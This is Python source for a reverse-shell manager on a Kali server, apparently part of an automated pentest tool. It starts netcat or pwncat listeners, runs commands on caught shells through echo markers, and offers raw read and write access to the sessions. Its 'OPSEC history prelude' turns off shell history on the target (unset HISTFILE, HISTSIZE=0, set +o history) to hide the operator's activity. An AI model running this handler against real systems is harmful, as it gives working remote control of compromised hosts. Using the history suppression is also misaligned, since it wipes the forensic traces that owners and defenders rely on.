#!/usr/bin/env python3
"""Reverse Shell Manager for Kali Server."""

import os
import time
import subprocess
import pty
import select
import signal
import threading
import uuid
import base64
import socket
import re
from typing import Dict, Any, Optional, Tuple
from .config import logger, COMMAND_TIMEOUT


# Escape sequences and readline's control bytes are stripped for the marker
# MATCH only. Every byte read from the shell still reaches the operator through
# send_command's output/all_lines and through read_output -- nothing here caps,
# truncates or rewrites captured output.
_ANSI_RE = re.compile(
    r"\x1b\[[0-9;?]*[ -/]*[@-~]"           # CSI ... final byte
    r"|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)"  # OSC ... BEL / ST
    r"|\x1b[@-Z\\-_]"                      # two-character escapes
    r"|[\x00-\x08\x0b\x0c\x0e-\x1f]"       # readline's \x01/\x02 prompt markers
)

# What may share a line with an executed marker without being output: escape
# sequences, the \r of a \r\n pair, tabs, spaces. \n is deliberately absent so
# a match can never span two lines.
_MARKER_PAD = (
    r"(?:\x1b\[[0-9;?]*[ -/]*[@-~]"
    r"|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)"
    r"|\x1b[@-Z\\-_]"
    r"|[ \t\r\x00-\x08\x0b\x0c\x0e-\x1f])*"
)

# The history prelude is drained up to its own marker before the command's
# markers are written. Bounded, and paid once per session.
_PRELUDE_DRAIN_SECONDS = 3.0


def _executed_marker(line: str, marker: str) -> bool:
    """True only when ``line`` IS the marker, not an echo of the typed line.

    A PTY echoes whatever is written to it, so ``echo 'START_x'`` comes back
    whether or not anything on the far end ran it. Substring containment cannot
    tell that echo from the bare ``START_x`` a shell prints when it executes the
    line -- which is why a live-but-silent caught shell used to answer
    ``success: true`` with ``lines_captured: 0`` while the work never happened.
    Equality on the ANSI-stripped line can tell them apart.

    ANSI is stripped for the match only; the caller's ``line`` is untouched.
    """
    return _ANSI_RE.sub("", line).strip() == marker


def _executed_marker_span(text: str, marker: str) -> Optional[Tuple[int, int]]:
    """``(start, end)`` of the executed standalone marker line in ``text``.

    Offsets index ``text`` exactly as given, so slices taken from them keep
    every raw byte. Returns None when only the echoed ``echo '<marker>'`` form
    is present.

    This exists because ``text.find(marker)`` returns the FIRST occurrence,
    which in a PTY stream is the echo of the typed line -- so anchoring the
    base64 slice on it computed ``clean_content`` from the echo, the exact
    taint the executed-marker match is here to remove.
    """
    match = re.search(
        rf"(?m)^{_MARKER_PAD}{re.escape(marker)}{_MARKER_PAD}$", text
    )
    if match is None:
        return None
    return match.start(), match.end()


class ReverseShellManager:
    """Class to manage reverse shell sessions with interactive capabilities"""

    def __init__(self, port: int, session_id: str, listener_type: str = "pwncat"):
        self.port = port
        self.session_id = session_id
        self.listener_type = listener_type  # 'netcat' or 'pwncat'
        self.process = None
        self.master_fd = None
        self.slave_fd = None
        self.is_connected = False
        self.last_output = ""
        self.listener_thread = None
        self.output_buffer = []
        self.max_buffer_size = 1000
        # Trigger management attributes
        self.trigger_process = None
        self.trigger_thread = None
        # Has the OPSEC history prelude been written on this session yet.
        self._history_prelude_sent = False
        # read_output's carry-over, and the reason it can promise that nothing
        # is discarded. Both were LOCALS, so every byte os.read had taken off
        # the PTY and not yet returned was destroyed when the call ended:
        # _raw_read_buf held a newline-less remainder (`Password: `, `>>> `,
        # `(gdb) ` -- exactly what the raw channel exists to drive) and the
        # complete lines past max_lines had nowhere to go either.
        self._raw_read_buf = b""
        self._raw_pending_lines = []
        # Whether the last send_command saw its executed end marker on a live
        # session. None until one has been tried -- never inferred from the
        # socket, because a live socket is not a usable channel.
        self._shell_responsive = None
        self._shell_last_command_at = None

    def _is_port_in_use(self, port: int) -> bool:
        """Check if a port is already in use using multiple validation methods"""
        try:
            # Method 1: Check with netstat for any existing listeners
            netstat_result = subprocess.run(
                f"netstat -an | grep :{port} | grep LISTEN",
                shell=True,
                capture_output=True,
                text=True,
                timeout=3
            )

            if netstat_result.stdout.strip():
                logger.info(f"Port {port} is already in use (netstat check)")
                return True

            # Method 2: Try to bind to the port with socket
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as test_socket:
                    test_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    test_socket.bind(('0.0.0.0', port))
                    test_socket.listen(1)
                    logger.debug(f"Port {port} appears to be free (socket test passed)")
                    return False
            except (socket.error, OSError) as e:
                logger.info(f"Port {port} is already in use (socket bind failed: {e})")
                return True

        except Exception as e:
            logger.error(f"Error checking port {port}: {e}")
            # If we can't check, assume it's in use to be safe
            return True

        return False

    def start_listener(self) -> Dict[str, Any]:
        """Start a reverse shell listener using specified listener_type ('netcat' or 'pwncat')"""
        try:
            # Check if port is already in use before attempting to start
            if self._is_port_in_use(self.port):
                return {
                    "success": False,
                    "error": f"Port {self.port} is already in use. Please choose a different port.",
                    "session_id": self.session_id
                }

            logger.info(f"Starting reverse shell listener '{self.listener_type}' on port {self.port}")
            if self.listener_type == 'pwncat':
                # Try different pwncat variants, fallback to netcat if none work
                # Removed pwncat-cs due to Python version compatibility issues
                pwncat_commands = [
                    f"pwncat -l {self.port}",
                    f"pwncat --listen {self.port}"
                ]

                command = None
                pwncat_found = False

                # Test which pwncat is available
                for cmd in pwncat_commands:
                    test_program = cmd.split()[0]
                    try:
                        test_result = subprocess.run(f"which {test_program}", shell=True, capture_output=True, timeout=5)
                        if test_result.returncode == 0:
                            command = cmd
                            pwncat_found = True
                            logger.info(f"Found pwncat variant: {test_program}")
                            break
                    except:
                        continue

                if not pwncat_found:
                    logger.warning("No pwncat variant found, falling back to netcat")
                    command = f"nc -nvlp {self.port}"
                    self.listener_type = "netcat"  # Update type for consistency

                # Use PTY allocation for both pwncat and netcat fallback
                master_fd, slave_fd = pty.openpty()
                self.master_fd = master_fd
                self.slave_fd = slave_fd
                # Spawn listener attached to the slave side of PTY
                self.process = subprocess.Popen(
                    command,
                    shell=True,
                    stdin=slave_fd,
                    stdout=slave_fd,
                    stderr=slave_fd,
                    preexec_fn=os.setsid  # Create new process group
                )
                # Close slave FD in parent, communicate via master_fd
                os.close(slave_fd)
                # Don't assume immediate connection
                self.is_connected = False
            else:
                # Default to netcat with PTY allocation
                command = f"nc -nvlp {self.port}"
                # Allocate pseudo-terminal
                master_fd, slave_fd = pty.openpty()
                self.master_fd = master_fd
                self.slave_fd = slave_fd
                # Spawn netcat listener attached to the slave side of PTY
                self.process = subprocess.Popen(
                    command,
                    shell=True,
                    stdin=slave_fd,
                    stdout=slave_fd,
                    stderr=slave_fd,
                    preexec_fn=os.setsid  # Create new process group
                )
                # Close slave FD in parent, communicate via master_fd
                os.close(slave_fd)
                # Don't assume connection until actually established
                self.is_connected = False

            # Critical validation: Check if process started successfully
            time.sleep(0.5)  # Give process time to initialize
            if self.process.poll() is not None:
                # Process has already terminated, likely due to bind error
                try:
                    # Try to read any error output from the master_fd
                    ready, _, _ = select.select([self.master_fd], [], [], 0.1)
                    error_msg = "Process terminated immediately"
                    if ready:
                        try:
                            error_data = os.read(self.master_fd, 1024)
                            if error_data:
                                error_output = error_data.decode('utf-8', errors='ignore').strip()
                                if error_output:
                                    error_msg = f"Process error: {error_output}"
                        except:
                            pass

                    # Clean up resources
                    try:
                        os.close(self.master_fd)
                    except:
                        pass
                    self.process = None
                    self.master_fd = None

                    return {
                        "success": False,
                        "error": f"Failed to start {self.listener_type} listener on port {self.port}. {error_msg}. Port may already be in use.",
                        "session_id": self.session_id
                    }
                except Exception as validation_error:
                    logger.error(f"Error during process validation: {validation_error}")
                    return {
                        "success": False,
                        "error": f"Failed to start {self.listener_type} listener on port {self.port}. Process validation failed.",
                        "session_id": self.session_id
                    }

            # Process appears to be running, start monitoring thread
            self.listener_thread = threading.Thread(target=self._monitor_connection)
            self.listener_thread.daemon = True
            self.listener_thread.start()

            return {
                "success": True,
                "message": f"Reverse shell listener started using {self.listener_type} on port {self.port}",
                "session_id": self.session_id,
                "listener_command": command
            }
        except Exception as e:
            logger.error(f"Error starting reverse shell listener: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }

    def _monitor_connection(self):
        """Monitor the pwncat/netcat reverse shell connection with continuous monitoring"""
        timeout_count = 0
        max_timeout = 30  # Initial connection timeout
        connection_established = False

        logger.info(f"Starting connection monitoring for {self.listener_type} on port {self.port}")

        # Phase 1: Wait for initial connection
        while timeout_count < max_timeout and self.process and self.process.poll() is None:
            try:
                # Check for incoming connections on the port
                netstat_result = subprocess.run(
                    f"netstat -an | grep :{self.port} | grep ESTABLISHED",
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=2
                )

                if netstat_result.stdout.strip():
                    self.is_connected = True
                    connection_established = True
                    logger.info(f"{self.listener_type.capitalize()} reverse shell connection established on port {self.port}")
                    break

                time.sleep(1)
                timeout_count += 1

            except Exception as e:
                logger.error(f"Error monitoring connection: {str(e)}")
                break

        if not connection_established:
            logger.warning(f"No {self.listener_type} connection established within {max_timeout} seconds")
            return

        # Phase 2: Continuous monitoring of established connection
        logger.info(f"Starting continuous monitoring of established connection on port {self.port}")
        while self.process and self.process.poll() is None:
            try:
                # Check if connection is still active
                netstat_result = subprocess.run(
                    f"netstat -an | grep :{self.port} | grep ESTABLISHED",
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=2
                )

                current_connected = bool(netstat_result.stdout.strip())

                # Update connection status if changed
                if current_connected != self.is_connected:
                    self.is_connected = current_connected
                    if current_connected:
                        logger.info(f"Connection re-established on port {self.port}")
                    else:
                        logger.info(f"Connection lost on port {self.port}")

                # Check every 5 seconds during continuous monitoring
                time.sleep(5)

            except Exception as e:
                logger.error(f"Error in continuous monitoring: {str(e)}")
                break

        # Connection monitoring ended (process died or error)
        self.is_connected = False
        logger.info(f"Connection monitoring ended for port {self.port}")

    def _drain_shell_buffer(self):
        """Drain any residual output from the shell buffer to prevent contamination"""
        if not (self.process and self.process.stdout):
            return

        try:
            # Quick drain of any pending output
            drain_count = 0
            while drain_count < 20:  # Limit to prevent infinite loop
                ready, _, _ = select.select([self.process.stdout], [], [], 0.05)
                if not ready:
                    break
                try:
                    line = self.process.stdout.readline()
                    if isinstance(line, bytes):
                        line = line.decode('utf-8', errors='ignore')
                    if not line:
                        break
                    drain_count += 1
                except:
                    break
        except Exception as e:
            pass

    def _send_history_prelude(self) -> bool:
        """Keep our own marker lines out of the TARGET's shell history.

        This is NOT the forbidden log redaction. Nothing is withheld from the
        OPERATOR: every byte the shell sends still comes back through
        send_command's output and through read_output, and the prelude itself is
        logged below. What it keeps out of ``~/.bash_history`` on the target is
        the operator's OWN injected ``echo 'START_x'`` scaffolding -- an
        operator read those markers back out of /home/worker/.bash_history and
        spent time treating them as the target's activity.

        Each command is guarded individually with its own ``2>/dev/null`` and
        separated by ``;`` rather than ``&&``, because dash/ash/busybox and
        restricted shells have no ``set -o history``: unguarded, that error
        would print into the session, i.e. into the very capture the executed
        marker fix exists to keep clean. One failing command cannot abort the
        rest, and a shell that supports none of them is left exactly as it was.

        The prelude carries its own marker and everything up to and including
        that marker's executed line is drained and discarded, so neither the
        prelude nor its echo can ever enter a command's captured output.

        Returns whether the prelude bytes were written. It never claims the
        target honoured them -- no shell reports that, and inferring it from a
        successful write would be the same mistake as reading success off a
        live socket.
        """
        marker = f"PRELUDE_{uuid.uuid4().hex[:8]}"
        prelude = (
            "unset HISTFILE 2>/dev/null; "
            "export HISTFILE=/dev/null 2>/dev/null; "
            "unset HISTSIZE 2>/dev/null; "
            "export HISTSIZE=0 2>/dev/null; "
            "set +o history 2>/dev/null; "
            f"echo '{marker}'\r\n"
        )
        try:
            os.write(self.master_fd, prelude.encode())
        except OSError as exc:
            logger.warning(f"Could not send the history prelude: {exc}")
            return False
        self._history_prelude_sent = True
        logger.info(f"Sent history prelude on {self.session_id}, marker {marker}")
        self._drain_until_marker(marker, _PRELUDE_DRAIN_SECONDS)
        return True

    def _drain_until_marker(self, marker: str, budget: float) -> bool:
        """Read and discard up to and including ``marker``'s executed line.

        Only ever used for the history prelude. The bytes discarded here are our
        own prelude and its echo -- nothing the operator asked for -- and they
        are logged at debug level so even those are recoverable from the
        container log. Bounded by ``budget``: a shell that never answers costs a
        few seconds once, not the command's budget.
        """
        deadline = time.time() + budget
        seen = ""
        found = False
        while time.time() < deadline:
            try:
                rlist, _, _ = select.select([self.master_fd], [], [], 0.5)
            except Exception as exc:
                logger.debug(f"Prelude drain select failed: {exc}")
                break
            if self.master_fd not in rlist:
                continue
            try:
                data = os.read(self.master_fd, 4096)
            except OSError as exc:
                logger.debug(f"Prelude drain read failed: {exc}")
                break
            if not data:
                break
            seen += data.decode(errors="ignore")
            if _executed_marker_span(seen, marker) is not None:
                found = True
                break
        logger.debug(f"Prelude drain discarded (found={found}): {seen!r}")
        return found

    def send_raw(self, input_text: str) -> Dict[str, Any]:
        """Write bytes straight to the shell. No markers, no capture.

        send_command needs the far end to echo a bare marker line back. When it
        cannot -- no TTY on the target, a wedged prompt, a REPL or an
        interactive program holding stdin -- the caught session used to be a
        write-off, because the only tool-reachable way in was the marker scrape
        (job_manager's send_input/read_output serve zebbern_exec jobs, never
        active_sessions). This is the write half of the escape hatch;
        read_output is the read half.

        The caller supplies any trailing newline, the same contract send_input
        has for jobs. A successful write means the bytes left this process and
        nothing more: it is not evidence the far end ran them. Read the reply
        with read_output.
        """
        if not self.is_connected or self.master_fd is None:
            return {
                "success": False,
                "error": "No active reverse shell connection",
                "bytes_written": 0,
                "session_id": self.session_id,
            }
        payload = input_text.encode()
        try:
            written = os.write(self.master_fd, payload)
        except OSError as exc:
            return {
                "success": False,
                "error": f"write to the shell failed: {exc}",
                "bytes_written": 0,
                "session_id": self.session_id,
            }
        return {
            "success": True,
            "bytes_written": written if isinstance(written, int) else len(payload),
            "session_id": self.session_id,
        }

    def send_command(
        self,
        command: str,
        timeout: int = 45,
        suppress_history: bool = True,
    ) -> Dict[str, Any]:
        """Send a command to the reverse shell with simple marker approach"""
        if not self.is_connected:
            return {
                "success": False,
                "error": "No active reverse shell connection",
                "output": ""
            }

        try:
            # Always use PTY approach since both pwncat and netcat now use PTY
            use_pty = True
            logger.info(f"Using PTY approach for {self.listener_type} listener")

            if use_pty:
                logger.info(f"Executing command via PTY: {command}")
                # Generate unique markers
                start_marker_id = str(uuid.uuid4())[:8]
                end_marker_id = str(uuid.uuid4())[:8]
                start_marker = f"START_{start_marker_id}"
                end_marker = f"END_{end_marker_id}"

                # Special handling for base64 commands that output on single line
                is_base64_command = "base64" in command.lower()

                # OPSEC prelude, once per session, before any marker is written
                # so neither it nor its echo can land inside a capture. See
                # _send_history_prelude for why this is not log redaction.
                if suppress_history and not self._history_prelude_sent:
                    self._send_history_prelude()

                # Send start marker, command, and end marker via PTY
                os.write(self.master_fd, (f"echo '{start_marker}'\r\n").encode())
                time.sleep(0.3 if is_base64_command else 0.2)  # Extra time for base64
                os.write(self.master_fd, (command + "\r\n").encode())
                time.sleep(0.5 if is_base64_command else 0.2)  # More time for base64 output
                os.write(self.master_fd, (f"echo '{end_marker}'\r\n").encode())

                # Collect output between markers with improved buffering
                start_time = time.time()
                all_lines = []
                buffer = b""
                capture_mode = False
                end_marker_found = False
                # How the read loop ended, which decides success. Without
                # these every exit looked identical to a completed command.
                session_closed = False
                read_error = ""

                # For base64 commands, we need to handle continuous output without line breaks
                if is_base64_command:
                    captured_data = b""
                    raw_buffer = b""  # Keep all data for debugging

                    while time.time() - start_time < timeout and not end_marker_found:
                        try:
                            rlist, _, _ = select.select([self.master_fd], [], [], 2.0)  # Longer select timeout
                            if self.master_fd in rlist:
                                data = os.read(self.master_fd, 8192)  # Larger buffer for base64
                                if not data:
                                    time.sleep(0.1)
                                    continue

                                raw_buffer += data
                                captured_data += data

                                # Convert to text for marker detection
                                text_buffer = raw_buffer.decode(errors='ignore')

                                # Look for the EXECUTED start marker line. Both
                                # the boolean test and the slice offsets come
                                # from the same match: .find(marker) returns the
                                # PTY echo of `echo 'START_x'`, so anchoring on
                                # it sliced clean_content from the echo.
                                start_span = _executed_marker_span(text_buffer, start_marker)
                                if start_span and not capture_mode:
                                    capture_mode = True
                                    # Look for the first newline after the executed marker line
                                    newline_pos = text_buffer.find('\n', start_span[1])
                                    if newline_pos != -1:
                                        # Reset captured_data to start after the marker line
                                        remaining_text = text_buffer[newline_pos + 1:]
                                        captured_data = remaining_text.encode()
                                    continue

                                # Look for the EXECUTED end marker line
                                end_span = _executed_marker_span(text_buffer, end_marker)
                                if end_span and capture_mode:
                                    # Extract content before end marker - use full text_buffer instead of partial content
                                    end_pos = end_span[0]
                                    # Find start position after the executed start marker line
                                    start_span = _executed_marker_span(text_buffer, start_marker)
                                    start_line_end = (
                                        text_buffer.find('\n', start_span[1])
                                        if start_span else -1
                                    )
                                    if start_line_end != -1:
                                        # Extract everything between start marker line and end marker
                                        clean_content = text_buffer[start_line_end + 1:end_pos]
                                    else:
                                        clean_content = text_buffer[
                                            (start_span[0] if start_span else 0):end_pos
                                        ]

                                    end_marker_found = True

                                    # Process the base64 content more carefully
                                    # Extract base64 content from the entire clean_content using regex

                                    # Method 1: Look for base64 sequences that may be concatenated with text
                                    # The issue is that base64 content is concatenated like: "UmVhbCBkb3dubG9hZCB0ZXN0IDE3NTQxNDk3NTEKecho"

                                    # First try: Look for base64 followed by 'echo' (the most common case)
                                    echo_concat_pattern = r'([A-Za-z0-9+/]{16,}={0,2})echo'
                                    echo_matches = re.findall(echo_concat_pattern, clean_content)

                                    for match in echo_matches:
                                        # Ensure proper padding
                                        padded_match = match
                                        while len(padded_match) % 4 != 0:
                                            padded_match += '='

                                        # Test if it's valid base64
                                        try:
                                            test_decode = base64.b64decode(padded_match)
                                            if len(test_decode) > 3:  # Must decode to something meaningful
                                                all_lines.append(padded_match)
                                        except Exception:
                                            pass

                                    # Second try: Look for standalone base64 sequences (original approach)
                                    if not all_lines:
                                        base64_pattern = r'([A-Za-z0-9+/]{20,}={0,2})'  # At least 20 chars, optional padding
                                        base64_matches = re.findall(base64_pattern, clean_content)

                                        for match in base64_matches:
                                            # Validate base64 format and length
                                            if len(match) >= 8:
                                                # Clean any trailing non-base64 characters
                                                clean_match = re.sub(r'[^A-Za-z0-9+/=].*$', '', match)

                                                # Ensure proper padding
                                                while len(clean_match) % 4 != 0:
                                                    clean_match += '='

                                                # Test if it's valid base64 by trying to decode
                                                try:
                                                    test_decode = base64.b64decode(clean_match)
                                                    if len(test_decode) > 5:  # Must decode to something meaningful
                                                        all_lines.append(clean_match)
                                                except Exception:
                                                    pass

                                    # Method 2: If no matches found, try line-by-line with better filtering
                                    if not all_lines:
                                        lines = clean_content.strip().split('\n')

                                        for line in lines:
                                            line = line.strip()

                                            # Skip obvious non-content lines
                                            if (not line or
                                                line == command or
                                                line.endswith('$') or
                                                line.startswith('echo ') or
                                                'START_' in line or
                                                line.startswith(command.split()[0])):
                                                continue

                                            # Method 2a: Extract base64 from lines that contain 'echo ' (with space before echo)
                                            if 'echo ' in line:
                                                # Split on 'echo ' and take everything before it
                                                base64_part = line.split('echo ')[0].strip()
                                                if base64_part and len(base64_part) > 8:
                                                    try:
                                                        # Ensure proper padding
                                                        while len(base64_part) % 4 != 0:
                                                            base64_part += '='
                                                        test_decode = base64.b64decode(base64_part)
                                                        if len(test_decode) > 5:
                                                            all_lines.append(base64_part)
                                                            continue
                                                    except Exception:
                                                        pass

                                            # Method 2b: Handle concatenated case (base64Kecho without space)
                                            echo_pos = line.find('echo')
                                            if echo_pos > 0:  # Echo found, but not at start
                                                base64_part = line[:echo_pos].strip()
                                                if base64_part and len(base64_part) > 8:
                                                    try:
                                                        # Ensure proper padding
                                                        while len(base64_part) % 4 != 0:
                                                            base64_part += '='
                                                        test_decode = base64.b64decode(base64_part)
                                                        if len(test_decode) > 5:
                                                            all_lines.append(base64_part)
                                                            continue
                                                    except Exception:
                                                        pass

                                            # Method 2c: Check if the entire line is pure base64
                                            if re.match(r'^[A-Za-z0-9+/=]+$', line) and len(line) > 8:
                                                try:
                                                    # Ensure proper padding
                                                    padded_line = line
                                                    while len(padded_line) % 4 != 0:
                                                        padded_line += '='
                                                    test_decode = base64.b64decode(padded_line)
                                                    if len(test_decode) > 5:
                                                        all_lines.append(padded_line)
                                                except Exception:
                                                    pass

                                    break
                            else:
                                # No immediate data available, but keep waiting
                                time.sleep(0.2)
                        except Exception as e:
                            logger.error(f"Error reading PTY data for base64: {e}")
                            break
                else:
                    # Regular line-by-line processing for non-base64 commands
                    while time.time() - start_time < timeout and not end_marker_found:
                        try:
                            rlist, _, _ = select.select([self.master_fd], [], [], 1.0)
                            if self.master_fd in rlist:
                                data = os.read(self.master_fd, 4096)  # Larger buffer
                                if not data:
                                    # EOF on the master fd: the shell on the far
                                    # end is gone. Nothing ran, and this used to
                                    # fall through to an unconditional
                                    # success: True.
                                    session_closed = True
                                    break
                                buffer += data

                                # Process complete lines
                                while b"\n" in buffer:
                                    line, buffer = buffer.split(b"\n", 1)
                                    text = line.decode(errors='ignore').strip()

                                    # Skip empty lines and command echoes
                                    if not text or text == command:
                                        continue

                                    # Start capturing after the EXECUTED start
                                    # marker line. `start_marker in text` also
                                    # matched the PTY's echo of the typed
                                    # `echo 'START_x'`.
                                    if _executed_marker(text, start_marker):
                                        capture_mode = True
                                        continue

                                    # Stop capturing at the EXECUTED end marker
                                    # line. This is the one that decides
                                    # success, and the echo used to set it on a
                                    # live session where nothing ran at all.
                                    if _executed_marker(text, end_marker):
                                        end_marker_found = True
                                        break

                                    # Only capture lines between markers
                                    if capture_mode and text:
                                        # Drop the PTY's echo of OUR OWN marker
                                        # commands, and nothing else. An
                                        # interactive shell prefixes that echo
                                        # with its prompt
                                        # (`root@h:~# echo 'END_x'`), so the old
                                        # startswith("echo '") test never saw
                                        # it. That did not matter while the END
                                        # test was substring containment --
                                        # it fired on the echo and broke the
                                        # loop before the line could be
                                        # appended. Matching the executed marker
                                        # moved the stopping point past the
                                        # echo, so the echo started reaching the
                                        # operator: one marker line the old code
                                        # never leaked. Match the exact command
                                        # text we wrote, which carries this
                                        # call's random marker, so no genuine
                                        # output line can collide with it.
                                        # ANSI is stripped for the MATCH ONLY;
                                        # `text` is appended verbatim.
                                        probe = _ANSI_RE.sub("", text)
                                        marker_echo = (
                                            f"echo '{start_marker}'" in probe
                                            or f"echo '{end_marker}'" in probe
                                        )
                                        if not marker_echo:
                                            all_lines.append(text)
                                            logger.info(f"Captured via PTY: '{text}'")
                            else:
                                # No data available, short sleep
                                time.sleep(0.1)
                        except Exception as e:
                            logger.error(f"Error reading PTY data: {e}")
                            read_error = str(e)
                            break

                # The end marker is the only evidence the command actually ran
                # to completion. This used to return success: True whichever
                # way the loop exited -- marker seen, EOF because the shell
                # died, timeout, or a read error -- so a command sent to a dead
                # session came back successful with empty output, which reads
                # as "it ran and printed nothing".
                #
                # A PTY echoes what is written to it, so both markers can turn
                # up in the read data as the echo of the command line with no
                # shell behind it. capture_mode and end_marker_found are
                # therefore not proof on their own; the session has to still be
                # alive as well.
                timed_out = not end_marker_found and not session_closed and not read_error
                if session_closed:
                    # Nothing else will come from this session. Say so here so
                    # the next call's guard fires instead of trying again.
                    self.is_connected = False

                # A live socket is not a usable channel, so record what the
                # channel actually did here rather than letting get_status infer
                # it from netstat. None until a command has been tried.
                self._shell_responsive = bool(end_marker_found and not session_closed)
                self._shell_last_command_at = time.time()

                output = '\n'.join(all_lines)
                result = {
                    "success": bool(end_marker_found and not session_closed),
                    "output": output,
                    "command": command,
                    "session_id": self.session_id,
                    "lines_captured": len(all_lines),
                    "execution_time": time.time() - start_time,
                    "session_closed": session_closed,
                    "timed_out": timed_out,
                    "partial_results": bool((timed_out or session_closed) and all_lines),
                    # The prelude was written on this session. It does not claim
                    # the target honoured it, and it hides nothing from the
                    # operator -- see _send_history_prelude.
                    "history_suppressed": self._history_prelude_sent,
                    "debug_info": {
                        "start_marker": start_marker,
                        "end_marker": end_marker,
                        "end_marker_found": end_marker_found,
                        "capture_mode_activated": capture_mode
                    }
                }
                if session_closed:
                    result["error"] = (
                        "the reverse shell closed before the command completed; "
                        "it did not run. Check reverse_shell_status and start a "
                        "new listener."
                    )
                elif timed_out:
                    result["error"] = (
                        f"no end marker within {timeout}s; the command may still "
                        "be running on the target and any output above is partial"
                    )
                elif read_error:
                    result["error"] = f"error reading from the shell: {read_error}"
                return result

        except Exception as e:
            logger.error(f"Error executing command: {e}")
            return {
                "success": False,
                "error": str(e),
                "output": ""
            }

    def _is_shell_noise(self, line):
        """Check if a line is shell noise that should be filtered out"""
        if not line.strip():
            return True

        noise_patterns = [
            "bash: cannot set terminal process group",
            "Inappropriate ioctl for device",
            "bash: no job control in this shell",
            "james@knife:",
            "listening on [any]",  # netcat listener noise
            "connect to",  # netcat connection noise
            "Connection from"  # netcat connection established
        ]

        # Check for complete shell prompt patterns (not just $)
        if line.endswith("$ ") or line.endswith("$"):
            return True

        for pattern in noise_patterns:
            if pattern in line:
                return True

        return False

    def get_status(self) -> Dict[str, Any]:
        """Get the status of the reverse shell session"""
        # Check if process is actually alive
        process_alive = self.process and self.process.poll() is None

        # If process is dead, connection should be false
        if not process_alive:
            self.is_connected = False

        # Double-check connection status with netstat if process is alive
        actual_connection = False
        if process_alive:
            try:
                netstat_result = subprocess.run(
                    f"netstat -an | grep :{self.port} | grep ESTABLISHED",
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=2
                )
                actual_connection = bool(netstat_result.stdout.strip())
                # Update internal state based on actual network status
                self.is_connected = actual_connection
            except Exception as e:
                logger.debug(f"Error checking connection status: {e}")
                # If we can't check, assume disconnected for safety
                self.is_connected = False

        return {
            "session_id": self.session_id,
            "port": self.port,
            "is_connected": self.is_connected,
            "process_alive": process_alive,
            "listener_active": self.listener_thread and self.listener_thread.is_alive(),
            "actual_network_connection": actual_connection,
            # is_connected, process_alive and actual_network_connection are
            # TCP-and-process facts, and all three were true on a channel that
            # had stopped executing anything: the socket stays ESTABLISHED while
            # the far end sits on a wedged prompt, holds stdin in an interactive
            # program, or echoes without a shell behind it. A live process is not
            # a working one, so responsiveness is reported separately and only
            # from evidence -- an executed end marker -- never inferred from the
            # socket. None means no command has been tried on this session yet.
            # Check this and send_command's timed_out, not is_connected, before
            # concluding the channel works.
            "shell_responsive": self._shell_responsive,
            "shell_last_command_at": self._shell_last_command_at,
            "shell_responsive_note": (
                "shell_responsive is None until a command has run, True only "
                "when one reached its executed end marker on a live session, "
                "and False when the last one timed out or the session closed. "
                "is_connected/actual_network_connection are socket facts and do "
                "not attest that the far end executes anything."
            ),
        }

    def read_output(
        self,
        timeout: int = 5,
        max_lines: int = 100,
        drop_shell_noise: bool = False,
    ) -> str:
        """Read any pending output from the PTY without sending a command.

        The read half of the raw escape hatch (send_raw is the write half). It
        is a bounded POLLING WINDOW, not a transcript: ``max_lines`` bounds what
        one call returns, and whatever is left over is carried ON THE SESSION
        and returned by the next call, the same way job_output's ring is a
        window over a job. Nothing is discarded to make room -- that is why both
        carry-overs live on the instance. They used to be locals, so every byte
        ``os.read`` had taken off the PTY and not yet returned died with the
        call: a newline-less remainder, and any complete line past ``max_lines``.

        A newline-less remainder is returned by the window that READ it, not
        held back until a newline arrives. That is the whole point of this
        channel: a REPL, ``su`` asking for a password, ``(gdb)`` -- the things
        the marker scrape cannot drive -- all stop on a prompt with no newline,
        and a prompt withheld for one more call is an operator staring at an
        empty window unable to tell it from a hung target. The cost is that a
        line split across two windows comes back in two pieces; every byte and
        its order survive either way.

        ``max_lines`` is a HARD ceiling on what one call returns, because the
        surplus is carried rather than dropped. It was a soft one: the ceiling
        was tested only between reads, so a burst of 500 lines inside a single
        ``os.read`` returned all 500 while the route reported
        ``window_limit: 100``.

        Lines are stripped and blank ones skipped, as they always have been.
        ``drop_shell_noise`` defaults to False so this returns every line as it
        arrived, prompts included. Pass True only if you want the prompt/banner
        filter -- it drops any line ending in ``$``, which on a raw channel is
        real output often enough that it must not be the default. The filter is
        applied as a line is handed back, so a carried-over line is judged by
        the flag of the call that returns it, not the one that read it.
        """
        if not self.is_connected or not self.master_fd:
            return ""
        pending = self._raw_pending_lines
        buf = self._raw_read_buf
        lines = []

        def _hand_over():
            """Move carried complete lines into this window, up to max_lines.

            Called after every read as well as before the first one, so the
            ceiling binds inside a single burst and the surplus stays in
            ``pending`` instead of overshooting the limit the route reports.
            """
            while pending and len(lines) < max_lines:
                text = pending.pop(0)
                if not text:
                    continue
                if drop_shell_noise and self._is_shell_noise(text):
                    continue
                lines.append(text)

        deadline = time.time() + timeout
        consecutive_empty = 0
        _hand_over()
        while time.time() < deadline and len(lines) < max_lines:
            ready, _, _ = select.select([self.master_fd], [], [], 0.5)
            if self.master_fd in ready:
                try:
                    data = os.read(self.master_fd, 4096)
                    if not data:
                        consecutive_empty += 1
                        if consecutive_empty >= 3:
                            break
                        continue
                    consecutive_empty = 0
                    buf += data
                    while b"\n" in buf:
                        line, buf = buf.split(b"\n", 1)
                        pending.append(line.decode(errors="ignore").strip())
                    _hand_over()
                except OSError:
                    break
            else:
                # Quiet for a select interval. A pending remainder ends the
                # window too, so a bare prompt comes back in ~0.5s rather than
                # sitting here for the full budget.
                if lines or buf:
                    break
        if buf and len(lines) < max_lines:
            remainder = buf.decode(errors="ignore").strip()
            if remainder:
                buf = b""
                if not (drop_shell_noise and self._is_shell_noise(remainder)):
                    lines.append(remainder)
        self._raw_read_buf = buf
        self._raw_pending_lines = pending
        return "\n".join(lines)

    def raw_carry_over(self) -> Dict[str, int]:
        """What read_output has taken off the PTY and not yet handed back.

        Reported so a full window is distinguishable from the end of the
        output. With ``max_lines`` a hard ceiling, "I got exactly my limit" no
        longer implies "and that was everything", and the alternative to saying
        so is an operator who stops polling with lines still held here.
        """
        return {
            "lines": len(self._raw_pending_lines),
            "bytes": len(self._raw_read_buf),
        }

